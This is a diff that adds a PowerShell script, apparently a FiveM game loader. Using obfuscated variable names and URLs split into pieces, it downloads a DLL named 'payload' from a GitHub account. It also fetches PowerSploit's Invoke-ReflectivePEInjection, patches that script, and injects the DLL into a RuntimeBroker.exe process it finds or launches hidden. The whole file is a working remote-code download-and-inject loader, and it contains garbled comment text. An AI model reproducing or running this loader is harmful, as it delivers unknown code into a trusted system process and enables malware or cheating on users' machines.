@@ -1,0 +1,95 @@
+$ErrorActionPreference = "Stop"
+
+$_0x91A = @(
+"https://raw",
+".githubusercontent",
+".com/t3rm1n4l-inf1c0z",
+"/fivem/refs",
+"/heads/main/",
+"payload"
+) -join ""
+
+Write-Host "[*] Searching for RuntimeBroker.exe..." -ForegroundColor Cyan
+
+$runtimeProc = Get-Process -Name "RuntimeBroker" -ErrorAction SilentlyContinue | Select-Object -First 1
+
+if ($null -eq $runtimeProc) {
+    Write-Host "[!] RuntimeBroker not found, starting new instance..." -ForegroundColor Yellow
+    
+    $runtimePath = "C:\Windows\System32\RuntimeBroker.exe"
+    if (Test-Path $runtimePath) {
+        try {
+            $shell = New-Object -ComObject WScript.Shell
+            $shell.Run($runtimePath, 0, $false)
+            Start-Sleep -Seconds 3
+        } catch {
+            Start-Process $runtimePath -WindowStyle Hidden -ErrorAction SilentlyContinue
+            Start-Sleep -Seconds 3
+        }
+        
+        $runtimeProc = Get-Process -Name "RuntimeBroker" -ErrorAction SilentlyContinue | Select-Object -First 1
+        
+        if ($null -eq $runtimeProc) {
+            # à¸§à¸´à¸˜à¸µà¸—à¸µà¹ˆ 3: trigger à¸œà¹ˆà¸²à¸™ Windows Store
+            Write-Host "[*] Trying alternative method..." -ForegroundColor Yellow
+            Start-Process "ms-windows-store:" -WindowStyle Hidden -ErrorAction SilentlyContinue
+            Start-Sleep -Seconds 3
+            
+            $runtimeProc = Get-Process -Name "RuntimeBroker" -ErrorAction SilentlyContinue | Select-Object -First 1
+            
+            if ($null -eq $runtimeProc) {
+                Write-Host "[ERROR] Failed to start RuntimeBroker. Please start it manually and run this script again." -ForegroundColor Red
+                Write-Host "[INFO] You can start any Windows Store app to trigger RuntimeBroker" -ForegroundColor Cyan
+                exit 1
+            }
+        }
+    } else {
+        Write-Host "[ERROR] RuntimeBroker.exe not found at $runtimePath" -ForegroundColor Red
+        exit 1
+    }
+}
+
+$targetPID = $runtimeProc.Id
+Write-Host "[+] Found RuntimeBroker PID: $targetPID" -ForegroundColor Green
+
+Write-Host "[*] Downloading DLL..." -ForegroundColor Cyan
+$_0x7C1 = New-Object System.Net.WebClient
+$_0x7C1.Headers.Add("User-Agent", "Mozilla/5.0")
+$_0x5F9 = $_0x7C1.DownloadData($_0x91A)
+Write-Host "[+] DLL downloaded ($($_.0x5F9.Length) bytes)" -ForegroundColor Green
+
+Write-Host "[*] Downloading injection script..." -ForegroundColor Cyan
+$_0x3D2 = @(
+"https://raw",
+".githubusercontent",
+".com/PowerShellMafia",
+"/PowerSploit/master",
+"/CodeExecution/",
+"Invoke-ReflectivePEInjection.ps1"
+) -join ""
+
+$_0x8E4 = "$env:TEMP\Reflective_$(Get-Random).ps1"
+Invoke-WebRequest -Uri $_0x3D2 -OutFile $_0x8E4 -UseBasicParsing
+
+$_0xA77 = Get-Content $_0x8E4 -Raw
+$_0xA77 = $_0xA77 -replace '\$GetProcAddress\s*=\s*\$UnsafeNativeMethods\.GetMethod\(''GetProcAddress''\)', '$GetProcAddress = $UnsafeNativeMethods.GetMethod(''GetProcAddress'', [Type[]]@([System.Runtime.InteropServices.HandleRef], [String]))'
+$_0xA77 = $_0xA77 -replace '\$GetModuleHandle\s*=\s*\$UnsafeNativeMethods\.GetMethod\(''GetModuleHandle''\)', '$GetModuleHandle = $UnsafeNativeMethods.GetMethod(''GetModuleHandle'', [Type[]]@([String]))'
+
+$_0xC11 = "$env:TEMP\Reflective_fixed.ps1"
+$_0xA77 | Set-Content $_0xC11 -Encoding UTF8
+
+. $_0xC11
+
+Write-Host "[*] Injecting into PID $targetPID..." -ForegroundColor Cyan
+try {
+    Invoke-ReflectivePEInjection -PEBytes $_0x5F9 -ProcId $targetPID
+    Write-Host "[SUCCESS] Injection completed!" -ForegroundColor Green
+} catch {
+    Write-Host "[ERROR] Injection failed: $_" -ForegroundColor Red
+    exit 1
+}
+
+Start-Process "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" -ErrorAction SilentlyContinue
+
+Write-Host "`n[*] Done! Press any key to exit..." -ForegroundColor Cyan
+$null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
